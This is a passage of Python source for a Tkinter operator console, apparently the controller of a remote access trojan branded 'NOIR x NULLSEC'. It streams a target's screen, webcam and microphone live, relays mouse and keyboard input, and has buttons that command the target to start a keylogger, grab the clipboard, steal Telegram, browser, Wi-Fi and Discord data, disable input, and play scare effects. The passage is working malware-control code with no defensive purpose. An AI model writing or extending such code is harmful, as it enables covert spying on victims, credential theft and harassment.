                    win.after(0, lambda: status.config(text='LIVE', fg='#00cc00'))
                except Exception:
                    return
                for chunk in r.iter_content(chunk_size=4096):
                    if not running[0]:
                        break
                    buf += chunk
                    a = buf.find(b'\xff\xd8')
                    b2 = buf.find(b'\xff\xd9')
                    if a != -1 and b2 != -1 and b2 > a:
                        jpg = buf[a:b2 + 2]
                        buf = buf[b2 + 2:]
                        try:
                            img = Image.open(io.BytesIO(jpg))
                            cw = cam_canvas.winfo_width()
                            ch = cam_canvas.winfo_height()
                            if cw > 10 and ch > 10:
                                scale = min(cw / img.width, ch / img.height)
                                img = img.resize(
                                    (int(img.width * scale), int(img.height * scale)),
                                    Image.Resampling.LANCZOS)
                            photo = ImageTk.PhotoImage(img)
                            def upd(p=photo):
                                try:
                                    cam_canvas.itemconfig(cam_img_id, image=p)
                                    cam_canvas.image = p
                                except Exception:
                                    pass
                            win.after(0, upd)
                        except Exception:
                            pass
            except Exception as ex:
                try:
                    win.after(0, lambda: status.config(text=str(ex)[:60], fg='#cc0000'))
                except Exception:
                    pass

        threading.Thread(target=wcam_loop, daemon=True).start()

    def _open_wcam_stream(self):
        if not self.wcam_url:
            return
        if self._wcam_stream_win and self._wcam_stream_win.winfo_exists():
            self._wcam_stream_win.lift()
            return
        self.send('wcam_stream_on')
        win = tk.Toplevel(self.root)
        win.title(f"NOIR Webcam LIVE  —  {self.ip}")
        win.geometry("680x520")
        win.configure(bg='#050000')
        self._wcam_stream_win = win

        def on_close():
            self.send('wcam_stream_off')
            self._wcam_stream_win = None
            win.destroy()
        win.protocol("WM_DELETE_WINDOW", on_close)

        canvas = tk.Canvas(win, bg='#050000', highlightthickness=0)
        canvas.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        img_id = canvas.create_image(0, 0, anchor=tk.NW)
        status = tk.Label(win, text=self.L('connecting'), fg='#cccc00', bg='#050000',
                          font=('Consolas', 9))
        status.pack(pady=2)

        def wcam_loop():
            try:
                r = requests.get(self.wcam_url, stream=True, timeout=6)
                buf = b''
                try:
                    win.after(0, lambda: status.config(text='LIVE', fg='#00cc00'))
                except Exception:
                    return
                for chunk in r.iter_content(chunk_size=4096):
                    if not (self._wcam_stream_win and self._wcam_stream_win.winfo_exists()):
                        break
                    buf += chunk
                    a = buf.find(b'\xff\xd8')
                    b2 = buf.find(b'\xff\xd9')
                    if a != -1 and b2 != -1 and b2 > a:
                        jpg = buf[a:b2 + 2]
                        buf = buf[b2 + 2:]
                        try:
                            img = Image.open(io.BytesIO(jpg))
                            cw = canvas.winfo_width()
                            ch = canvas.winfo_height()
                            if cw > 10 and ch > 10:
                                scale = min(cw / img.width, ch / img.height)
                                img = img.resize(
                                    (int(img.width * scale), int(img.height * scale)),
                                    Image.Resampling.LANCZOS)
                            photo = ImageTk.PhotoImage(img)
                            def upd(p=photo):
                                canvas.itemconfig(img_id, image=p)
                                canvas.image = p
                            win.after(0, upd)
                        except Exception:
                            pass
            except Exception as ex:
                try:
                    win.after(0, lambda: status.config(text=str(ex)[:60], fg='#cc0000'))
                except Exception:
                    pass

        threading.Thread(target=wcam_loop, daemon=True).start()

    def _toggle_mic_stream(self):
        if self._mic_active:
            self._mic_active = False
            return
        if not self.mic_url:
            return
        self._mic_active = True

        def mic_loop():
            try:
                import pyaudio
            except ImportError:
                import tkinter.messagebox as mb
                self.root.after(0, lambda: mb.showerror(
                    "Mic Stream", "pyaudio не установлен.\nЗапустите: pip install pyaudio"))
                self._mic_active = False
                return
            pa = pyaudio.PyAudio()
            out = pa.open(format=pyaudio.paInt16, channels=1, rate=16000,
                          output=True, frames_per_buffer=1600)
            try:
                r = requests.get(self.mic_url, stream=True, timeout=6)
                buf = b''
                for chunk in r.iter_content(chunk_size=1024):
                    if not self._mic_active:
                        break
                    buf += chunk
                    while len(buf) >= 3200:
                        out.write(buf[:3200])
                        buf = buf[3200:]
            except Exception:
                pass
            out.stop_stream()
            out.close()
            pa.terminate()
            self._mic_active = False

        threading.Thread(target=mic_loop, daemon=True).start()

    # ──────────────────────────────────────────────
    #  REMOTE CONTROL SCREEN
    # ──────────────────────────────────────────────

    def show_remote_screen(self, dev=None):
        self.clear_root()
        self.connected = True

        dev_name = dev.get('name', self.ip) if dev else self.ip

        # === TOP BAR ===
        top = tk.Frame(self.root, bg='#0d0000', height=50, highlightbackground='#330000',
                       highlightthickness=1)
        top.pack(fill=tk.X)

        logo_frame = tk.Frame(top, bg='#0d0000')
        logo_frame.pack(side=tk.LEFT, padx=12, pady=6)

        ttk.Button(logo_frame, text=self.L('back'),
                   command=self._back_to_devices, style='TButton').pack(side=tk.LEFT, padx=(0, 8))

        tk.Label(logo_frame, text="NOIR", fg='#cc0000', bg='#0d0000',
                 font=('Arial Black', 16, 'bold')).pack(side=tk.LEFT)
        tk.Label(logo_frame, text=" PROTECTION ", fg='#661111', bg='#0d0000',
                 font=('Consolas', 10)).pack(side=tk.LEFT)

        conn_frame = tk.Frame(top, bg='#0d0000')
        conn_frame.pack(side=tk.LEFT, padx=20)
        self.target_lbl = tk.Label(conn_frame, text=f"{self.L('target')} {dev_name}  ({self.ip})",
                                   fg='#888888', bg='#0d0000', font=('Consolas', 10))
        self.target_lbl.pack(side=tk.LEFT, padx=(0, 6))

        self.btn_connect = ttk.Button(conn_frame, text=self.L('disconnect'),
                                      command=self._back_to_devices, style='Red.TButton')
        self.btn_connect.pack(side=tk.LEFT, padx=6)

        right_frame = tk.Frame(top, bg='#0d0000')
        right_frame.pack(side=tk.RIGHT, padx=12)
        self.btn_lang = ttk.Button(right_frame, text=self.L('lang_btn'),
                                   command=self._toggle_lang_remote)
        self.btn_lang.pack(side=tk.RIGHT, padx=6)
        self.status_var = tk.StringVar(value=self.L('connecting'))
        self.status_lbl = tk.Label(right_frame, textvariable=self.status_var,
                                   fg='#cccc00', bg='#0d0000',
                                   font=('Consolas', 11, 'bold'))
        self.status_lbl.pack(side=tk.RIGHT, padx=12)

        # === MAIN AREA ===
        main = tk.Frame(self.root, bg='#0a0a0a')
        main.pack(fill=tk.BOTH, expand=True, padx=8, pady=4)

        # === CANVAS (stream) ===
        canvas_frame = tk.Frame(main, bg='#110000', highlightbackground='#220000',
                                highlightthickness=1)
        canvas_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 4))
        self.canvas = tk.Canvas(canvas_frame, bg='#050000', highlightthickness=0,
                                cursor='crosshair')
        self.canvas.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        self.img_id = self.canvas.create_image(0, 0, anchor=tk.NW)

        # === BOTTOM PANEL ===
        self.bottom = tk.Frame(self.root, bg='#0a0a0a')
        self.bottom.pack(fill=tk.X, padx=8, pady=(0, 8))
        self.build_buttons()

        # === INPUT BINDINGS ===
        self.canvas.bind('<Motion>', self.on_mouse_move)
        self.canvas.bind('<Button-1>', lambda e: self.on_click(e, 'left'))
        self.canvas.bind('<Button-3>', lambda e: self.on_click(e, 'right'))
        self.canvas.bind('<MouseWheel>', self.on_scroll_win)
        self.root.bind('<Key>', self.on_key)

        self.root.title(f"NOIR x NULLSEC  -  {dev_name} ({self.ip})")

        threading.Thread(target=self._check, daemon=True).start()
        threading.Thread(target=self._stream_loop, daemon=True).start()

    def _back_to_devices(self):
        self.connected = False
        self.current_image = None
        try:
            self.root.unbind('<Key>')
        except:
            pass
        self.show_device_screen()

    def _toggle_lang_remote(self):
        self.lang = 'en' if self.lang == 'ru' else 'ru'
        self.btn_lang.config(text=self.L('lang_btn'))
        self.btn_connect.config(text=self.L('disconnect'))
        self.build_buttons()

    def build_buttons(self):
        for w in self.bottom.winfo_children():
            w.destroy()

        groups = [
            (self.L('sys'), [
                (self.L('reboot'), 'reboot'), (self.L('shutdown'), 'shutdown'),
                (self.L('lock'), 'lockdown'), (self.L('unlock'), 'unlock'),
            ]),
            (self.L('monitor'), [
                (self.L('screenshot'), 'screenshot'), (self.L('camera'), 'cam'),
                (self.L('webcam'), 'webcam'),
                (self.L('kl_on'), 'keylog_on'), (self.L('kl_off'), 'keylog_off'),
                (self.L('kl_dump'), 'keylog_dump'), (self.L('clipboard'), 'clipboard'),
                (self.L('live_wcam'), '__live_wcam__'),
                (self.L('live_mic' if not self._mic_active else 'mic_stop'), '__live_mic__'),
            ]),
            (self.L('steal'), [
                (self.L('tg'), 'steal_tg'), (self.L('browser'), 'steal_br'),
                (self.L('wifi'), 'steal_wifi'), (self.L('discord'), 'steal_discord'),
                (self.L('steal_all'), 'steal_all'),
            ]),
            (self.L('control'), [
                (self.L('mouse_off'), 'mouse_off'), (self.L('mouse_on'), 'mouse_on'),
                (self.L('kb_off'), 'kb_off'), (self.L('kb_on'), 'kb_on'),
            ]),
            (self.L('info'), [
                (self.L('sysinfo'), 'sysinfo'), (self.L('processes'), 'processes'),
                (self.L('network'), 'netinfo'), (self.L('location'), 'location'),
                (self.L('software'), 'software'),
            ]),
            (self.L('effects'), [
                (self.L('bam'), 'bam'), (self.L('scream'), 'screamer'),
                (self.L('split'), 'split'), (self.L('quake'), 'quake'),
                (self.L('invert'), 'invert'), (self.L('crazy_on'), 'crazy_on'),
                (self.L('cursor'), 'cursor'), (self.L('restore_all'), 'restore_all'),
            ]),
        ]

        for gname, buttons in groups:
            gf = tk.LabelFrame(self.bottom, text=f" {gname} ", bg='#0a0a0a',
                               fg='#440000', font=('Consolas', 8, 'bold'),
                               highlightbackground='#1a0000', highlightthickness=1,
                               bd=0)
            gf.pack(side=tk.LEFT, padx=3, pady=2, fill=tk.Y)
            for txt, cmd in buttons:
                if cmd == '__live_wcam__':
                    ttk.Button(gf, text=txt,
                               command=self._open_wcam_stream).pack(side=tk.LEFT, padx=2, pady=3)
                elif cmd == '__live_mic__':
                    def _mic_click(self=self):
                        self._toggle_mic_stream()
                        self.build_buttons()
                    ttk.Button(gf, text=txt,
                               command=_mic_click).pack(side=tk.LEFT, padx=2, pady=3)
                else:
                    ttk.Button(gf, text=txt,
                               command=lambda c=cmd: self.send(c)).pack(side=tk.LEFT, padx=2, pady=3)

    # ──────────────────────────────────────────────
    #  NETWORK & STREAMING
    # ──────────────────────────────────────────────

    def load_config(self):
        try:
            with open(CONFIG_FILE, 'r') as f:
                d = json.load(f)
                self.ip = d.get('ip', '')
                self.lang = d.get('lang', 'ru')
        except:
            self.ip = ''

    def save_config(self):
        try:
            os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
            with open(CONFIG_FILE, 'w') as f:
                json.dump({'ip': self.ip, 'lang': self.lang}, f)
        except:
            pass

    def set_status(self, text, color='#333333'):
        self.status_var.set(text)
        self.status_lbl.config(fg=color)

    def _check(self):
        try:
            requests.get(self.control_url, timeout=3)
            self.set_status(self.L('online'), '#00cc00')
        except:
            self.set_status(self.L('no_resp'), '#cc0000')

    def _stream_loop(self):
        while self.running and self.connected:
            try:
                r = requests.get(self.stream_url, stream=True, timeout=5)
                buf = b''
                for chunk in r.iter_content(chunk_size=4096):
                    if not self.running or not self.connected:
                        break
                    buf += chunk
                    a = buf.find(b'\xff\xd8')
                    b = buf.find(b'\xff\xd9')
                    if a != -1 and b != -1 and b > a:
                        jpg = buf[a:b+2]
                        buf = buf[b+2:]
                        try:
                            img = Image.open(io.BytesIO(jpg))
                            self._show(img)
                        except:
                            pass
            except:
                if self.connected:
                    self.set_status(self.L('stream_err'), '#cc0000')
                time.sleep(2)

    def _show(self, img):
        try:
            cw = self.canvas.winfo_width()
            ch = self.canvas.winfo_height()
            if cw < 10 or ch < 10:
                return
            iw, ih = img.size
            scale = min(cw / iw, ch / ih)
            nw, nh = int(iw * scale), int(ih * scale)
            if nw != iw or nh != ih:
                img = img.resize((nw, nh), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            self.canvas.itemconfig(self.img_id, image=photo)
            self.canvas.image = photo
            self.current_image = photo
            self._img_w = iw
            self._img_h = ih
            self._disp_w = nw
            self._disp_h = nh
        except:
            pass

    def send(self, cmd, **kw):
        if not self.connected:
            return
        def _do():
            try:
                data = {'cmd': cmd}
                data.update(kw)
                requests.post(self.control_url, json=data, timeout=3)
            except:
                pass
        threading.Thread(target=_do, daemon=True).start()

    def _scale_coords(self, ex, ey):
        if not hasattr(self, '_img_w'):
            return ex, ey
        dw = getattr(self, '_disp_w', 1)
        dh = getattr(self, '_disp_h', 1)
        iw = getattr(self, '_img_w', 1)
        ih = getattr(self, '_img_h', 1)
        return int(ex * iw / dw), int(ey * ih / dh)

    def on_mouse_move(self, e):
        if not self.connected or not self.current_image:
            return
        now = time.time()
        if now - self._last_mouse_send < self._mouse_throttle:
            return
        self._last_mouse_send = now
        x, y = self._scale_coords(e.x, e.y)
        self.send('mouse_move', x=x, y=y)

    def on_click(self, e, button):
        if not self.connected:
            return
        x, y = self._scale_coords(e.x, e.y)
        self.send('mouse_move', x=x, y=y)
        self.send('mouse_click', button=button)

    def on_scroll_win(self, e):
        d = 1 if e.delta > 0 else -1
        self.send('mouse_scroll', delta=d)

    def on_key(self, e):
        if not self.connected:
            return
        focused = self.root.focus_get()
        if isinstance(focused, tk.Entry):
            return
        if e.char and ord(e.char) >= 32:
            self.send('key_press', key=e.char)
        else:
            sym = e.keysym.lower()
            mapped = {'return': 'enter', 'tab': 'tab', 'space': 'space',
                      'backspace': 'backspace', 'delete': 'delete', 'escape': 'escape'}
            k = mapped.get(sym)
            if k:
                self.send('key_press', key=k)

    def on_close(self):
        self.running = False
        self.connected = False
        self.save_config()
        self.root.destroy()
        sys.exit(0)

if __name__ == '__main__':
    RemoteClient()
